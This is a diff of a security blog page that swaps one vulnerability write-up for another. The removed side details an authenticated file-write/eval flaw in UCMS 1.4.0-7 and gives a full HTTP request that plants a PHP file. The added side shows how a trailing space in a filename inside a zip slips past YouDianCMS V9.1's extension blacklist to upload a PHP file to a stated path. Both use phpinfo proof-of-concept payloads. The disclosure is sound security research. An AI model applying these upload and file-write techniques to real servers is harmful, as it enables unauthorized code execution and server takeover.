@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>&#39;UCMS v.1.4.0-7Command execution&#39; | LS-Loophole</title>
+  <title>&#39;Zip uses win feature to decompress, bypass blacklist and upload&#39; | LS-Loophole</title>
   <meta name="keywords" content="">
-  <meta name="description" content="&#39;UCMS v.1.4.0-7Command execution&#39; | LS-Loophole">
+  <meta name="description" content="&#39;Zip uses win feature to decompress, bypass blacklist and upload&#39; | LS-Loophole">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Zip uses win feature to decompress, bypass blacklist and uploadVulnerability Type :File upload Vulnerability Version :YouDianCMS V9.1 Recurring environment: Windows 10 PHP 5.4.5 Apache 2.4.23  Vulnera">
 <meta property="og:type" content="article">
@@ -277,9 +277,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-UCMS v.1.4.0-7Command execution" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-YouDianCMS V9.1 Zip uses win feature to decompress, bypass blacklist and upload" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">&#39;UCMS v.1.4.0-7Command execution&#39;</h1>
+        <h1 class="article-title">&#39;Zip uses win feature to decompress, bypass blacklist and upload&#39;</h1>
     
     <div class="article-meta">
         
@@ -289,7 +289,7 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2020-09-22 20:55:13'>2020-09-22 20:52</time>
+            发布时间 : <time class="date" title='最后更新: 2021-01-10 01:02:58'>2021-01-10 00:54</time>
         
     </div>
     <div class="article-meta">
@@ -311,7 +311,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UCMS-v-1-4-0-7Command-execution"><span class="toc-text">UCMS v.1.4.0-7Command execution</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Type"><span class="toc-text">Vulnerability Type :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Version"><span class="toc-text">Vulnerability Version :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recurring-environment"><span class="toc-text">Recurring environment:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Description-AND-recurrence"><span class="toc-text">Vulnerability Description AND recurrence:</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Zip-uses-win-feature-to-decompress-bypass-blacklist-and-upload"><span class="toc-text">Zip uses win feature to decompress, bypass blacklist and upload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Type"><span class="toc-text">Vulnerability Type :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Version"><span class="toc-text">Vulnerability Version :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recurring-environment"><span class="toc-text">Recurring environment:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Description-AND-recurrence"><span class="toc-text">Vulnerability Description AND recurrence:</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -327,43 +327,78 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="UCMS-v-1-4-0-7Command-execution"><a href="#UCMS-v-1-4-0-7Command-execution" class="headerlink" title="UCMS v.1.4.0-7Command execution"></a>UCMS v.1.4.0-7Command execution</h1><h2 id="Vulnerability-Type"><a href="#Vulnerability-Type" class="headerlink" title="Vulnerability Type :"></a>Vulnerability Type :</h2><p>Eval injection</p>
-<h2 id="Vulnerability-Version"><a href="#Vulnerability-Version" class="headerlink" title="Vulnerability Version :"></a>Vulnerability Version :</h2><p>1.4.0-7</p>
+        <h1 id="Zip-uses-win-feature-to-decompress-bypass-blacklist-and-upload"><a href="#Zip-uses-win-feature-to-decompress-bypass-blacklist-and-upload" class="headerlink" title="Zip uses win feature to decompress, bypass blacklist and upload"></a>Zip uses win feature to decompress, bypass blacklist and upload</h1><h2 id="Vulnerability-Type"><a href="#Vulnerability-Type" class="headerlink" title="Vulnerability Type :"></a>Vulnerability Type :</h2><p>File upload</p>
+<h2 id="Vulnerability-Version"><a href="#Vulnerability-Version" class="headerlink" title="Vulnerability Version :"></a>Vulnerability Version :</h2><p>YouDianCMS V9.1</p>
 <h2 id="Recurring-environment"><a href="#Recurring-environment" class="headerlink" title="Recurring environment:"></a>Recurring environment:</h2><ul>
 <li>Windows 10</li>
 <li>PHP 5.4.5</li>
 <li>Apache 2.4.23</li>
 </ul>
-<h2 id="Vulnerability-Description-AND-recurrence"><a href="#Vulnerability-Description-AND-recurrence" class="headerlink" title="Vulnerability Description AND recurrence:"></a>Vulnerability Description AND recurrence:</h2><p>1、The current version is V1.4.5<br><img src="/imgss/40.png"></p>
-<p>2、Using the keyword search, I found the fopen() function in the<br>\UCMS\sadmin\fileedit.php file, where there are no restrictions on the filename suffix and content to write! So the PHP suffix can be written here to cause malicious command execution!</p>
-<p><img src="/imgss/41.png"></p>
-<p>3、Here I backtrace, first $_POST[&amp;apos;co&amp;apos;] exists, then $_GET[&amp;apos;file&amp;apos;]) exists, and $_GET[&amp;apos;dir&amp;apos;] exists. Most of all! In the first line of the file, we determine if there is a global variable admin. In this case, we can&amp;apos;t do anything without authorization, we just have to look up where is the entry</p>
-<p><img src="/imgss/42.png"></p>
-<p>4、The current file is under/UCMS/UCMS. This is the background file. And all the data can be found through the background operation route/UCMS /index.php hole. Go to /UCMS/index.php here</p>
-<p><img src="/imgss/43.png"></p>
-<p>5、And you can actually see that right here, it&amp;apos;s included by requiring something here. For analysis here, GET type parameters do and NOHTML need to be passed. And split $_GET[&amp;apos;do&amp;apos;] with &amp;apos;_&amp;apos; as the divider. The first part is included as the name of the folder, and the second part is included as the file name +&amp;apos;.php&amp;apos;.</p>
-<p>6、So the idea here is pretty clear, the vulnerability file is fileedit.php and it&amp;apos;s under sadmin, so $_GET[&amp;apos;do&amp;apos;] is sadmin_fileEdit. This satisfies the criteria to enter the fileEdit file, at which point you only need to satisfy the criteria in Fileedit.php. Here the POST package is<br>as follows:</p>
-<pre><code>POST /ucms/?do=sadmin_fileedit&amp;amp;dir=/&amp;amp;file=CNVD.php&amp;amp;pos=15 HTTP/1.1
-Host: www.ucm1.5.0.com
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 
-Firefox/68.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Referer: 
-http://www.ucm1.5.0.com/ucms/?do=sadmin_fileedit&amp;amp;dir=/&amp;amp;file=123.php&amp;amp;pos=15
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 58
-Connection: close
-Cookie: admin_a83bb0=admin; psw_a83bb0=6609024d5fb57f730314b384acb138e4; 
-token_a83bb0=a81beeab
-Upgrade-Insecure-Requests: 1
+<h2 id="Vulnerability-Description-AND-recurrence"><a href="#Vulnerability-Description-AND-recurrence" class="headerlink" title="Vulnerability Description AND recurrence:"></a>Vulnerability Description AND recurrence:</h2><p><strong>Vulnerability hazard</strong></p>
+<p>Through this vulnerability, you can upload zip compressed package and use specific methods to bypass the blacklist restriction of zip resolvable suffix by using Windows features. In order to execute the command, to achieve the purpose of controlling the server!</p>
+<p><strong>Vulnerability analysis</strong></p>
+<p>The vulnerabilities are in the following areas: youdiancms, app, lib and action\ AdminBaseAction.class.php</p>
+<pre><code>//模板里的文件名不能包含php、jsp、asp、aspx等危险文件============
+             $map = array(&#39;php&#39;=&gt;true, &#39;jsp&#39;=&gt;true, &#39;asp&#39;=&gt;true, &#39;aspx&#39;=&gt;true);
+             for($n = 0; $n &lt; $count; $n++)&#123;
+                 if( $list[$n][&#39;folder&#39;]) continue;
+                 $filename = strtolower($list[$n][&#39;filename&#39;]);
+                 if(stripos($filename, &#39;/common_en.php&#39;) || stripos($filename,  &#39;/common_cn.php&#39;) )&#123;
 
-uuu_token=a81beeab&amp;amp;co=&amp;lt;?php phpinfo()?&amp;gt;&amp;amp;pos=17
-</code></pre>
-<p><img src="/imgss/44.png"></p>
-<p>7、Here our Webshell phpInfo is in CNVD.php in the root directory</p>
-<p><img src="/imgss/45.png"></p>
+
+                 &#125;else&#123;
+                     $ext = strtolower(yd_file_ext($filename));
+                     if(isset($map[$ext]))&#123;
+                         $this-&gt;ajaxReturn(null, &quot;模板不能包含&#123;$ext&#125;文件&quot; , 0);
+                     &#125;
+                 &#125;
+             &#125;
+             //==============================================
+&#125;</code></pre>
+<p><img src="/imgss/99.png"></p>
+<p>As you can see, line 116 clearly says that if the following occurs, the upload will fail</p>
+<pre><code>$map = array(&#39;php&#39;=&gt;true, &#39;jsp&#39;=&gt;true, &#39;asp&#39;=&gt;true, &#39;aspx&#39;=&gt;true);</code></pre>
+<p>This is quite different from the previous version. As you can see from the previous version, there is no such security detection at all!<br><img src="/imgss/100.png"></p>
+<p> Therefore, in the latest version of v9.1, the 9.0 compressed package upload method has failed, because it will detect the suffix of each file in the packet </p>
+<pre><code>if(isset($map[$ext]))&#123;
+    $this-&gt;ajaxReturn(null, &quot;模板不能包含&#123;$ext&#125;文件&quot; , 0);
+&#125;</code></pre>
+<p>The overall logic of this paragraph is as follows</p>
+<p>Loop out all the contents in the zip package, and $count is the collection of the current directory</p>
+<pre><code>for($n = 0; $n &lt; $count; $n++)&#123;</code></pre>
+<p>If the folder attribute of the current file is not empty, the next judgment will be performed</p>
+<pre><code> if( $list[$n][&#39;folder&#39;]) continue;</code></pre>
+<p>Put the name of the current file into $file name!</p>
+<pre><code>$filename = strtolower($list[$n][&#39;filename&#39;]);</code></pre>
+<p>Determine whether the current file is common_ en.php Or common_ cn.php And if so, no operation is performed. Continue down</p>
+<pre><code>    if(stripos($filename, &#39;/common_en.php&#39;) || stripos($filename, &#39;/common_cn.php&#39;) )&#123;
+&#125;else&#123;</code></pre>
+<p>Using YD_ file_ Ext returns the suffix of the current file name and converts all characters to lowercase with the strtolower() function</p>
+<pre><code>$ext = strtolower(yd_file_ext($filename));</code></pre>
+<p>If the suffix in $ext exists in the field $map [array (‘php ‘= &gt; true,’ JSP ‘= &gt; true,’ ASP ‘= &gt; true,’ ASPX ‘= &gt; true);]</p>
+<pre><code>if(isset($map[$ext]))&#123;</code></pre>
+<p>That is, if the suffix is PHP or JSP or ASP or ASPX, execute the following command. Return character, and upload failed!</p>
+<pre><code>$this-&gt;ajaxReturn(null, &quot;模板不能包含&#123;$ext&#125;文件&quot; , 0);</code></pre>
+<p>But there is a problem! It does not remove the spaces on both sides of the string! Here comes a question!We can use the white space feature of windows to bypass!</p>
+<p><strong>Loophole recurrence</strong></p>
+<p>First, download a compressed template package through the background template interface!<br><img src="/imgss/i1.png"></p>
+<p>Because this is the compressed package upload, so I directly modify it in the compressed package. Edit the file first cnvd.php</p>
+<pre><code>我是cnvd &lt;?php phpinfo();?&gt;</code></pre>
+<p><img src="/imgss/i2.png"></p>
+<p>You can see the name as follows<br><img src="/imgss/i3.png"></p>
+<p>Change it to cnvd.zip , and open the zip file. Will our cnvd.php Copy it in<br><img src="/imgss/i4.png"></p>
+<p>But this is not enough! We need to change the name to cnvd.php Space. Because of the win feature, we can’t make such a change on the desktop, so copy in the change.</p>
+<p>After the change, it can’t be seen from the length, but the open icon can’t recognize this file type!<br><img src="/imgss/i5.png"></p>
+<p>Upload here!<br><img src="/imgss/i6.png"></p>
+<p>You can see that the return information is successful!<br><img src="/imgss/i7.png"></p>
+<p>Here we can find the rule of template path!</p>
+<p>What we uploaded is cnvd.zip Trojan horse cnvd.php In the following path</p>
+<pre><code>\youdiancms\App\Tpl\Home\cnvd.php</code></pre>
+<p><img src="/imgss/i8.png"></p>
+<pre><code>http://www.youdiancms.com/App/Tpl/Home/cnvd.php</code></pre>
+<p><img src="/imgss/i9.png"></p>
+<p>Here you can try what it will look like if you don’t add spaces!</p>
+<p><img src="/imgss/i10.png"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至lingyu195@gmail.com </span>
